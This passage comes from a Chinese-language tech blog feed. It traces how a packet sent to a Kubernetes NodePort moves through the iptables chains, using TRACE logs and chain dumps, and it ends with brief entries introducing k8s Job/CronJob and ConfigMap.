1</span><br><span class="line">iptables -t raw -j TRACE -p tcp --dport 32741 -I OUTPUT 1</span><br></pre></td></tr></table></figure><h3 id="查看-var-log-messages-中的追踪记录"><a href="#查看-var-log-messages-中的追踪记录" class="headerlink" title="查看 /var/log/messages 中的追踪记录"></a>查看 <code>/var/log/messages</code> 中的追踪记录</h3><p>为了查看规则，现在某个机器上 curl 一下主机的 32741 端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">raw:PREROUTING:policy:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br><span class="line">nat:PREROUTING:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br><span class="line">nat:KUBE-SERVICES:rule:9 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br><span class="line">nat:KUBE-NODEPORTS:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br><span class="line">nat:KUBE-MARK-MASQ:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br><span class="line">nat:KUBE-MARK-MASQ:return:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">nat:KUBE-NODEPORTS:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">nat:KUBE-SVC-4N57TFCL4MD7ZTDA:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">nat:KUBE-SEP-PJQYOXMI5CEBVECW:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">filter:FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">filter:KUBE-FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">nat:POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">nat:KUBE-POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line">raw:PREROUTING:policy:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343890 ACK=3563071810 WINDOW=4106 RES=0x00 ACK URGP=0 OPT (0101080A08CB9A71008611F0)</span><br></pre></td></tr></table></figure><p>根据上面的图我们知道报文是按照 <code>nat:PREROUTING</code> -&gt; <code>filter:FORWARD</code> -&gt; <code>nat:POSTROUTING</code> 传输的。</p><p>按规则分析，先看第一条：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nat:PREROUTING:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br></pre></td></tr></table></figure><p>iptables 的 PREROUTING 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SERVICES  all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes service portals */</span><br><span class="line">DOCKER     all  --  0.0.0.0/0            0.0.0.0/0            ADDRTYPE match dst-type LOCAL</span><br></pre></td></tr></table></figure><p>可以看出所有报文都会匹配第一条规则，也就是 <code>KUBE-SERVICES</code>, 也就是 trace 里的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nat:KUBE-SERVICES:rule:9 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br></pre></td></tr></table></figure><p>再看 iptables 的 KUBE-SERVICES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SERVICES (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  udp  -- !192.168.3.0/24       192.168.2.10         /* kube-system/kube-dns:dns cluster IP */ udp dpt:53</span><br><span class="line">KUBE-SVC-TCOU7JCQXEZGVUNU  udp  --  0.0.0.0/0            192.168.2.10         /* kube-system/kube-dns:dns cluster IP */ udp dpt:53</span><br><span class="line">KUBE-MARK-MASQ  tcp  -- !192.168.3.0/24       192.168.2.10         /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53</span><br><span class="line">KUBE-SVC-ERIFXISQEP7F7OF4  tcp  --  0.0.0.0/0            192.168.2.10         /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:53</span><br><span class="line">KUBE-MARK-MASQ  tcp  -- !192.168.3.0/24       192.168.2.1          /* default/kubernetes:https cluster IP */ tcp dpt:443</span><br><span class="line">KUBE-SVC-NPX46M4PTMTKRN6Y  tcp  --  0.0.0.0/0            192.168.2.1          /* default/kubernetes:https cluster IP */ tcp dpt:443</span><br><span class="line">KUBE-MARK-MASQ  tcp  -- !192.168.3.0/24       192.168.2.125        /* default/nginx: cluster IP */ tcp dpt:80</span><br><span class="line">KUBE-SVC-4N57TFCL4MD7ZTDA  tcp  --  0.0.0.0/0            192.168.2.125        /* default/nginx: cluster IP */ tcp dpt:80</span><br><span class="line">KUBE-NODEPORTS  all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes service nodeports; NOTE: this must be the last rule in this chain */ ADDRTYPE match dst-type LOCAL</span><br></pre></td></tr></table></figure><p>很明显匹配的是 <code>KUBE-NODEPORTS</code>, 也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: nat:KUBE-NODEPORTS:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br></pre></td></tr></table></figure><p>iptables 的 KUBE-NODEPORTS 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-NODEPORTS (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/nginx: */ tcp dpt:32741</span><br><span class="line">KUBE-SVC-4N57TFCL4MD7ZTDA  tcp  --  0.0.0.0/0            0.0.0.0/0            /* default/nginx: */ tcp dpt:32741</span><br></pre></td></tr></table></figure><p>先走第一个条 <code>KUBE-MARK-MASQ</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: nat:KUBE-MARK-MASQ:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000)</span><br></pre></td></tr></table></figure><p>iptables 的 KUBE-MARK-MASQ 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-MARK-MASQ (11 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">MARK       all  --  0.0.0.0/0            0.0.0.0/0            MARK or 0x4000</span><br></pre></td></tr></table></figure><p>k8s 会给报文打上 <code>0x4000</code> 的标签, 打完标签后会返回，然后继续匹配 <code>KUBE-NODEPORTS</code> 的下一条规则。也就是 <code>KUBE-SVC-4N57TFCL4MD7ZTDA</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TRACE: nat:KUBE-MARK-MASQ:return:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line"></span><br><span class="line">TRACE: nat:KUBE-NODEPORTS:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br><span class="line"></span><br><span class="line">TRACE: nat:KUBE-SVC-4N57TFCL4MD7ZTDA:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br></pre></td></tr></table></figure><p>iptables 的 KUBE-SVC-4N57TFCL4MD7ZTDA 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SVC-4N57TFCL4MD7ZTDA (2 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-SEP-PJQYOXMI5CEBVECW  all  --  0.0.0.0/0            0.0.0.0/0</span><br></pre></td></tr></table></figure><p>进入 KUBE-SEP-PJQYOXMI5CEBVECW</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: nat:KUBE-SEP-PJQYOXMI5CEBVECW:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br></pre></td></tr></table></figure><p>iptables 的 KUBE-SEP-PJQYOXMI5CEBVECW 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-SEP-PJQYOXMI5CEBVECW (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-MARK-MASQ  all  --  192.168.3.4          0.0.0.0/0</span><br><span class="line">DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp to:192.168.3.4:80</span><br></pre></td></tr></table></figure><p>可以看到这里走的是 DNAT, 将报文中的目的地址换成了 <code>92.168.3.4:80</code>, 也就是 k8s 服务对应 pod 的 ip 和端口号。</p><p>DNAT 完了之后会将报文发给 filter 表的 FORWARD 链。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: filter:FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br></pre></td></tr></table></figure><p>iptables 的 FORWARD 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Chain FORWARD (policy DROP)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-FORWARD  all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes forwarding rules */</span><br><span class="line">DOCKER-ISOLATION  all  --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">DOCKER     all  --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED</span><br><span class="line">ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0</span><br><span class="line">ACCEPT     all  --  192.168.3.0/24       0.0.0.0/0</span><br><span class="line">ACCEPT     all  --  0.0.0.0/0            192.168.3.0/24</span><br></pre></td></tr></table></figure><p>可以看到匹配第一条，进入 KUBE-FORWARD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: filter:KUBE-FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br></pre></td></tr></table></figure><p>iptables 的 KUBE-FORWARD 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-FORWARD (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes forwarding rules */ mark match 0x4000/0x4000</span><br><span class="line">ACCEPT     all  --  192.168.3.0/24       0.0.0.0/0            /* kubernetes forwarding conntrack pod source rule */ ctstate RELATED,ESTABLISHED</span><br><span class="line">ACCEPT     all  --  0.0.0.0/0            192.168.3.0/24       /* kubernetes forwarding conntrack pod destination rule */ ctstate RELATED,ESTABLISHED</span><br></pre></td></tr></table></figure><p>forward 完了之后会转给 iptables 的 nat 表的 POSTROUTING:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: nat:POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br></pre></td></tr></table></figure><p>iptables 的 POSTROUTING 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Chain POSTROUTING (policy ACCEPT)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">KUBE-POSTROUTING  all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes postrouting rules */</span><br><span class="line">MASQUERADE  all  --  172.17.0.0/16        0.0.0.0/0</span><br><span class="line">RETURN     all  --  192.168.3.0/24       192.168.3.0/24</span><br><span class="line">MASQUERADE  all  --  192.168.3.0/24      !224.0.0.0/4</span><br><span class="line">RETURN     all  -- !192.168.3.0/24       192.168.3.0/24</span><br><span class="line">MASQUERADE  all  -- !192.168.3.0/24       192.168.3.0/24</span><br></pre></td></tr></table></figure><p>命中第一条，转给 KUBE-POSTROUTING</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRACE: nat:KUBE-POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000</span><br></pre></td></tr></table></figure><p>iptables 的 KUBE-POSTROUTING 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain KUBE-POSTROUTING (1 references)</span><br><span class="line">target     prot opt source               destination</span><br><span class="line">MASQUERADE  all  --  0.0.0.0/0            0.0.0.0/0            /* kubernetes service traffic requiring SNAT */ mark match 0x4000/0x4000</span><br></pre></td></tr></table></figure><p>汇总一下，大概路线如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">--&gt; [nat]PREROUTING</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">            V</span><br><span class="line">    [nat]KUBE-SERVICES</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">            V</span><br><span class="line">    [nat]KUBE-NODEPORTS</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">            V</span><br><span class="line">    [nat]KUBE-MARK-MASQ (打0x4000的标签)</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">            V</span><br><span class="line">    [nat]KUBE-NODEPORTS</span><br><span class="line">            |</span><br><span class="line">            |</span><br><span class="line">            V               </span><br><span class="line">    [nat]KUBE-SVC-4N57TFCL4MD7ZTDA               [filter]KUBE-FORWARD -----&gt; [nat]POSTROUTING</span><br><span class="line">            |                                              ^                          |</span><br><span class="line">            |                                              |                          |</span><br><span class="line">            V                                              |                          V</span><br><span class="line">    [nat]KUBE-SEP-PJQYOXMI5CEBVECW  ------------&gt;[filter]FORWARD            [nat]KUBE-POSTROUTING</span><br><span class="line">(DNAT, 替换DST和DPT, 将物理机地址换成pod地址)</span><br></pre></td></tr></table></figure><h3 id="清除追踪规则"><a href="#清除追踪规则" class="headerlink" title="清除追踪规则"></a>清除追踪规则</h3><ul><li><p>查看规则 number</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iptables -t raw -nL --line-number</span><br><span class="line">Chain PREROUTING (policy ACCEPT)</span><br><span class="line">num  target     prot opt source               destination</span><br><span class="line">1    TRACE      tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:32741</span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT)</span><br><span class="line">num  target     prot opt source               destination</span><br><span class="line">1    TRACE      tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:32741</span><br></pre></td></tr></table></figure></li><li><p>删除规则<br>上面查到的 number 是 <code>1</code>, 这里删除第一条规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iptables -t raw -D PREROUTING 1</span><br><span class="line">$ sudo iptables -t raw -D OUTPUT 1</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="http://www.opensourcerers.org/how-to-trace-iptables-in-rhel7-centos7/" target="_blank" rel="noopener">How to trace IPTables</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在访问 k8s 服务时，有时会出现一直连不上的问题，我们可以通过分析 iptables 和抓包的方式观察报文是否正确到达。关于 iptable 的介绍可以参考：&lt;a href=&quot;../../../../2018/06/29/iptables/&quot;&gt;iptables&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>k8s学习之job</title>
    <link href="http://yoursite.com/2018/11/21/k8s-job/"/>
    <id>http://yoursite.com/2018/11/21/k8s-job/</id>
    <published>2018-11-21T01:56:45.000Z</published>
    <updated>2018-11-25T06:48:43.027Z</updated>
    
    <content type="html"><![CDATA[<p>Kubernetes 有两种类型的 job, 分别是 <code>Job</code> 和 <code>CronJonb</code>。</p><ul><li>Job: 负责批量处理短暂的一次性任务，仅执行一次，并保证处理的一个或者多个Pod成功结束。</li><li>CronJob: 负责定时任务，在指定的时间周期运行指定的任务。</li></ul><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Kubernetes 有两种类型的 job, 分别是 &lt;code&gt;Job&lt;/code&gt; 和 &lt;code&gt;CronJonb&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Job: 负责批量处理短暂的一次性任务，仅执行一次，并保证处理的一个或者多个Pod成功结束。&lt;/li&gt;
&lt;li&gt;CronJob: 负责定时任务，在指定的时间周期运行指定的任务。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="PaaS" scheme="http://yoursite.com/categories/PaaS/"/>
    
    
      <category term="k8s" scheme="http://yoursite.com/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>k8s学习之configmap</title>
    <link href="http://yoursite.com/2018/11/21/k8s-configmap/"/>
    <id>http://yoursite.com/2018/11/21/k8s-configmap/</id>
    <published>2018-11-21T01:56:37.000Z</published>
    <updated>2018-11-30T14:58:32.265Z</updated>
    
    <content type="html"><![CDATA[<p>很多生产环境中的应用程序较为复杂，可能需要多个 config 文件，命令行参数和环境变量的组合。并且这些配置信息应该从镜像中解耦出来，以保证镜像的可移植性以及配置信息不被泄漏。社区使用 ConfigMap 满足这一需求。</p><p>ConfigMap 包含了一系列键值对，用于存储被 pod 或者系统组件（如 controller 等）访问的信息。</p><a id="more"></a><h2 id="创建-ConfigMap"><a href="#创建-ConfigMap" class="headerlink" title="创建 ConfigMap"></a>创建 ConfigMap</h2><h3 id="通过文件创建"><a href="#通过文件创建" class="headerlink" title="通过文件创建"></a>通过文件创建</h3><p><code>from-file</code> 的参数可以是单个文件，也可以是目录，如果多个文件可以使用多个 <code>--from-file</code>参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create configmap &lt;name&gt; --from-file=&lt;file&gt;</span><br></pre></td></tr></table></figure><h2 id="使用-ConfigMap-中的信息"><a href="#使用-ConfigMap-中的信息" class="headerlink" title="使用 ConfigMap 中的信息"></a>使用 ConfigMap 